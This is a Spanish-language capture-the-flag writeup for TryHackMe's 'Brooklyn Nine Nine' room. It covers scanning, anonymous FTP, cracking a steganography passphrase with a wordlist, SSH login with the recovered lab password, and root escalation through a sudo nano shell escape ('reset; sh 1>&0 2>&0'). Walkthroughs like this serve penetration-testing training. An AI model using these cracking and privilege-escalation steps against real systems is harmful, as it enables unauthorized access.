# 📝 CTF Writeup: Brooklyn Nine Nine 👮‍♂️ - TryHackMe

## 🌟 Introducción

Este writeup detalla la resolución de la sala Brooklyn Nine Nine de TryHackMe, una máquina diseñada para hackers principiantes. 

La sala se centra en el reconocimiento activo, la explotación de servicios web y la escalada de privilegios en sistemas Linux. Inspirada en la popular serie de televisión, esta máquina ofrece una oportunidad práctica para aplicar habilidades fundamentales de pentesting.

## 1️⃣ Paso 1: Reconocimiento Activo - ping 🎯

El primer paso en cualquier prueba de penetración es el reconocimiento activo, que consiste en verificar si la máquina objetivo está activa y accesible. Esto se logra mediante la utilidad ping.

<img width="564" height="223" alt="Ping" src="https://github.com/user-attachments/assets/ca3e34d3-07d2-4f42-b8c5-3fe470d72953" />


💻 Comando Ejecutado

Para confirmar la conectividad y obtener la dirección IP del objetivo (10.10.222.9), se ejecutó el siguiente comando, limitando la cantidad de paquetes a 4 (-c 4):
````
Bash

ping -c 4 10.10.222.9
````
📊 Resultado

El resultado del comando ping confirma que la máquina está operativa y que la comunicación es exitosa, sin pérdida de paquetes.


---

*Nota:El output de la terminal muestra la IP `10.10.222.9` como objetivo. Reemplaza esta IP con la dirección asignada por TryHackMe si es diferente en tu sesión.* 
---

```bash
PING 10.10.222.9 (10.10.222.9) 56(84) bytes of data.
64 bytes from 10.10.222.9: icmp_seq=1 ttl=63 time=51.0 ms
64 bytes from 10.10.222.9: icmp_seq=2 ttl=63 time=51.2 ms
64 bytes from 10.10.222.9: icmp_seq=3 ttl=63 time=50.2 ms
64 bytes from 10.10.222.9: icmp_seq=4 ttl=63 time=50.7 ms

--- 10.10.222.9 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 50.150/50.763/51.228/0.402 ms
````
✅ Conclusión del Paso 1

IP del Objetivo: 10.10.222.9 (Confirmada)

Conectividad: Exitosa (0% de pérdida de paquetes)


## 2️⃣ Paso 2: Escaneo de Puertos con Nmap 🔎

Una vez confirmada la accesibilidad de la máquina, el siguiente paso es identificar los servicios que se están ejecutando en el objetivo. Para esto, se utilizó la herramienta Nmap (Network Mapper) con opciones de escaneo detalladas.

💻 Comando Ejecutado

Se utilizó el escaneo agresivo (-A) para obtener información de versión, detección del sistema operativo y scripting por defecto, o en este caso, el escaneo de servicios y versiones (-sC y -sV respectivamente) para enumerar los puertos abiertos y sus versiones:
````
Bash

nmap -sC -sV 10.10.222.9
````
-sC: Realiza un escaneo utilizando scripts por defecto.

-sV: Intenta determinar la versión de los servicios que se ejecutan en los puertos abiertos.

📊 Resultado del Escaneo

Nmap encontró tres puertos principales abiertos en la máquina objetivo:
````
Puerto	Estado	Servicio	Versión	Información Relevante
21	open	ftp	vsftpd 3.0.3	Acceso Anónimo Permitido.
22	open	ssh	OpenSSH 7.6p1	Servicio de Secure Shell.
80	open	http	Apache httpd 2.4.29	Servidor web Apache (Ubuntu).
````

🔑 Detalles Clave

El resultado del escaneo en el Puerto 21 (FTP) es el más prometedor, ya que indica:

FTP Anónimo Permitido: La autenticación FTP anónima está habilitada (ftp-anon: Anonymous FTP login allowed).

✅ Conclusión del Paso 2

Los puertos 22 (SSH) y 80 (HTTP) están abiertos, pero el Puerto 21 (FTP) con acceso anónimo.


## 3️⃣ Paso 3: Explotación Inicial - Conexión FTP Anónima 📤

Como el escaneo de Nmap reveló que el servicio FTP permite el inicio de sesión anónimo y lista un archivo potencialmente interesante, el siguiente paso es conectarse al servidor y descargar dicho archivo.

💻 Conexión al Servicio FTP

<img width="444" height="192" alt="inicio ftp" src="https://github.com/user-attachments/assets/f3b46f88-5262-4daf-90c2-35f3018358ba" />


Se utilizó el cliente ftp en la terminal para conectarse al objetivo (10.10.222.9):
````
Bash

ftp 10.10.222.9
````
🔑 Autenticación Anónima

Al solicitar las credenciales, se ingresó Anonymous (o ftp) como nombre de usuario y se dejó la contraseña en blanco (o se ingresó cualquier cosa, como el correo electrónico, que es la práctica común, aunque muchos servidores permiten simplemente presionar Enter):
````
Bash

Connected to 10.10.222.9.
220 (vsFTPd 3.0.3)
Name (10.10.222.9:quiqu3h4ck): **Anonymous**
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
````
📁 Recuperación del Archivo

Una vez dentro, se procede a listar los archivos (ls) y descargar el archivo de la nota (note_to_jake.txt) que Nmap había identificado:

<img width="1068" height="253" alt="listamos y descargamos archivo" src="https://github.com/user-attachments/assets/b204c314-9ac5-4e54-9181-a8d4f37d9df1" />

````
Bash

ftp> ls
200 PORT command successful.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (773.44 KB/s)
ftp> quit
221 Goodbye.
````

💡 Análisis del Archivo

Tras salir de la conexión FTP, se lee el contenido del archivo descargado, note_to_jake.txt:

<img width="921" height="282" alt="leemos el archivo note" src="https://github.com/user-attachments/assets/72889aa5-3a55-4f18-8024-700fd69cf8d4" />

````
Bash

cat note_to_jake.txt
````
Contenido de note_to_jake.txt:

Jake,

Don't forget, I setup a web directory on the server, I used a common username and password. You know what it is.

Raymond

✅ Conclusión del Paso 3

El archivo note_to_jake.txt proporciona una pista crucial:

Existe un directorio web configurado en el servidor.

Las credenciales utilizadas son un nombre de usuario y contraseña comunes (common username and password).

La pista se relaciona con los personajes Jake y Raymond (de la serie Brooklyn Nine-Nine).


## 4️⃣ Paso 4: Análisis del Puerto 80 (HTTP) y Búsqueda de Pistas 🕵️

El paso anterior nos dejó con la tarea de investigar el servidor web (Puerto 80) en busca de un directorio oculto y credenciales. Primero, exploramos la página principal y su código fuente.

🌐 Visita a la Página Web

<img width="1509" height="978" alt="pagina puerto 80" src="https://github.com/user-attachments/assets/03a13e99-ebe8-49e4-a412-ab51be16e30a" />


Al navegar a la dirección IP del objetivo (http://10.10.222.9), se visualiza una página simple con una imagen grande del elenco de la serie Brooklyn Nine-Nine, lo cual es consistente con la temática de la sala.

🔍 Análisis del Código Fuente

Para encontrar cualquier pista oculta, se inspecciona el código fuente de la página web.

<img width="1549" height="566" alt="codigo fuente pag" src="https://github.com/user-attachments/assets/0422b085-41ca-4cb2-a842-365c2d99ca63" />

````
HTML

<body>
<div class="bg"></div>
<h1 class="bg">This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</h1>
</body>
</html>
````
💡 Pista Encontrada

En la parte inferior del código fuente, dentro de un comentario HTML, se encuentra una nueva pista:

Esta pista nos orienta hacia la esteganografía, la práctica de ocultar un mensaje secreto dentro de algo que no lo es. Lo más probable es que la información se oculte dentro de la imagen principal de la página.

✅ Conclusión del Paso 4

El análisis de la página principal del servidor web nos revela una pista crucial:

Enfoque de Ataque: La próxima acción debe centrarse en la esteganografía de la imagen.

Archivos Relevantes: El código fuente también revela el nombre de la imagen: url('brooklyn99.jpg').


## 5️⃣ Paso 5: Esteganografía y Descubrimiento de Credenciales 🖼️

Siguiendo la pista sobre la esteganografía y el nombre de la imagen (brooklyn99.jpg) obtenido del código fuente, el siguiente paso es descargar el archivo de la imagen y usar una herramienta para extraer cualquier dato oculto.

🔽 Descarga de la Imagen

<img width="1065" height="219" alt="me descargue la imagen y use steghide" src="https://github.com/user-attachments/assets/a89b54c2-ab3f-4f0d-b2f9-7fc1a6512101" />


La imagen se descarga directamente del servidor web (Puerto 80) utilizando la herramienta wget:
````
Bash

wget http://10.10.222.9/brooklyn99.jpg
````
🛠️ Uso de steghide

La herramienta más común en Linux para trabajar con esteganografía en imágenes JPEG es steghide. 

Se intenta extraer el contenido oculto del archivo, pero la herramienta requiere una frase de contraseña (salvoconducto o passphrase) para desencriptar los datos.
````
Bash

steghide extract -sf brooklyn99.jpg
````
🚨 Problema con steghide

Al intentar la extracción sin saber la contraseña, se recibe un error que indica que los datos están "compactados inservibles" (no puedo descompactar datos. datos compactados inservibles), lo cual es una indicación de que se necesita la frase de contraseña correcta.


## 6️⃣ Paso 6: Extracción de Credenciales por Esteganografía Avanzada 🔒

Tuvimos que utilizar una herramienta de cracking de esteganografía y luego steghide para obtener la credencial final.

🔨 Cracking de la Contraseña de Esteganografía

<img width="705" height="293" alt="uso herramienta stegcracken para contraseña" src="https://github.com/user-attachments/assets/2af93071-ba63-458a-9ec6-561dffddb00f" />


Se utilizó una herramienta especializada en cracking de esteganografía, como stegcracker (o la sugerida StegSeek), con una wordlist común (rockyou.txt) para encontrar la frase de contraseña oculta en brooklyn99.jpg.
````
Bash

stegcracker brooklyn99.jpg /ruta/a/wordlist.txt
````
En este caso, la contraseña para el archivo de esteganografía resultó ser admin:
````
Bash

Successfully cracked file with password: admin
Your file has been written to: brooklyn99.jpg.out
admin
````
🔑 Extracción de Credenciales con la Contraseña Hallada

Una vez que se descubrió la contraseña (admin), se utilizó steghide para extraer el archivo oculto, el cual se ha llamado note.txt en esta iteración (a diferencia de creds.txt del flujo anterior).

<img width="498" height="248" alt="obtengo la clave de la imagen para un ssh" src="https://github.com/user-attachments/assets/99f1323c-99ff-4003-b640-9d28b12347e1" />

````
Bash

steghide extract -sf brooklyn99.jpg
Anotar salvoconducto: **admin**
[...]
````
💡 Análisis de note.txt

El archivo extraído, note.txt, revela un nuevo conjunto de credenciales, presumiblemente para el usuario Raymond Holt:

````
Bash

cat note.txt
````

Contenido de note.txt:

Holts Password:

fluffydog12@ninenine

Enjoy!!

✅ Conclusión del Paso 6

Ahora tenemos un nombre de usuario potencial (implícito en la nota, holt o raymond) y una contraseña para el usuario Holt:

Usuario Potencial: holt (o raymond, basado en el contexto de la nota)

Contraseña: fluffydog12@ninenine


## 7️⃣ Paso 7: Acceso Inicial y Flag de Usuario (User Flag) 🔓

Con las credenciales (holt:fluffydog12@ninenine) obtenidas a través de esteganografía, el siguiente paso es obtener acceso a la máquina a través del protocolo SSH.

<img width="700" height="374" alt="entro con ssh y obtenemos flag de user" src="https://github.com/user-attachments/assets/2180a4f5-ea3d-470e-aaf7-c950235273ee" />


💻 Conexión por SSH

Se intenta iniciar sesión con el usuario holt en la IP objetivo:

````
Bash

ssh holt@10.10.222.9
````
Tras ingresar la contraseña (fluffydog12@ninenine), la conexión es exitosa:

````
Bash

holt@10.10.222.9's password: **fluffydog12@ninenine**
holt@brookly_nine_nine:~$
````
Hemos obtenido una shell de bajo privilegio como el usuario holt.

🚩 Obtención de la Flag de Usuario

Una vez dentro, se listan los archivos en el directorio home del usuario (/home/holt/) y se procede a leer el archivo de la flag de usuario:

````
Bash

holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
[Contenido de la flag de usuario]
````
(Aquí se incluye la primera flag, user.txt)

🔍 Verificación de Permisos (SUDO)

El siguiente paso es la escalada de privilegios. Se utiliza el comando sudo -l para verificar qué comandos puede ejecutar el usuario holt como superusuario (root) sin necesidad de contraseña.

<img width="980" height="140" alt="permisos holt" src="https://github.com/user-attachments/assets/e07684bf-db19-4c85-904a-657b32c7e6e3" />

````
Bash

holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    **(ALL) NOPASSWD: /bin/nano**
````
✅ Conclusión del Paso 7

Acceso Inicial: Obtenido exitosamente vía SSH como usuario holt.

Flag de Usuario: Leída (user.txt).

Vector de Escalada de Privilegios: El usuario holt puede ejecutar el editor de texto /bin/nano como cualquier usuario (incluyendo root) sin requerir contraseña (NOPASSWD).


## 8️⃣ Paso 8: Escalada de Privilegios a Root (Root Flag) 👑

El análisis de permisos con sudo -l reveló que el usuario holt puede ejecutar /bin/nano con privilegios de root sin contraseña. Este es un exploit de binario común que se puede encontrar documentado en recursos como GTFOBins.

🔎 Búsqueda en GTFOBins

<img width="1117" height="544" alt="gtfobins sudo" src="https://github.com/user-attachments/assets/08a3efb5-cb70-46ab-a2c9-e3cd29508605" />

Se consultó la página de GTFOBins para el binario nano y la capacidad de ejecutarlo con sudo. La sección "Sudo" proporciona la técnica para escapar del editor y obtener una shell con privilegios elevados.

El método es el siguiente:

Ejecutar sudo nano para iniciar el editor con privilegios de root.

Dentro de nano, utilizar la función de ayuda o ejecutar un comando shell.

<img width="732" height="123" alt="hago un sudo nano con el comando" src="https://github.com/user-attachments/assets/1ef736b6-5b0c-45a7-a02e-d909fd818720" />


💻 Ejecución de la Escalada

Se ejecuta nano como root:
````
Bash

holt@brookly_nine_nine:~$ sudo /bin/nano
````
Una vez dentro del editor nano:

Presiona Ctrl+R (Read File/Leer Archivo).

Presiona Ctrl+X para cancelar la lectura de archivo e ir al prompt de comando (Command to execute).

Ingresa el comando para obtener una shell bash:
````
Command to execute: reset; sh 1>&0 2>&0
````
Este comando ejecuta una nueva shell (sh) que hereda los privilegios del proceso padre, que es sudo nano (ejecutándose como root).

🔀 Obtención de la Shell de Root

Al ejecutar el comando, se obtiene una nueva shell con el prompt de root (#):

<img width="749" height="331" alt="ejecuto el comando y obtenemos la flag root" src="https://github.com/user-attachments/assets/4ed04de8-0f1e-4f9c-a378-bec020ade843" />

````
Bash

whoami
root
````
Hemos obtenido acceso de root a la máquina.

🚩 Obtención de la Flag de Root

Finalmente, se navega al directorio home de root (/root) y se lee el archivo root.txt para completar el CTF:

````
Bash

cd /root
ls
root.txt
cat root.txt
[Contenido de la flag de root]
````
(Aquí se incluye la flag final, root.txt)

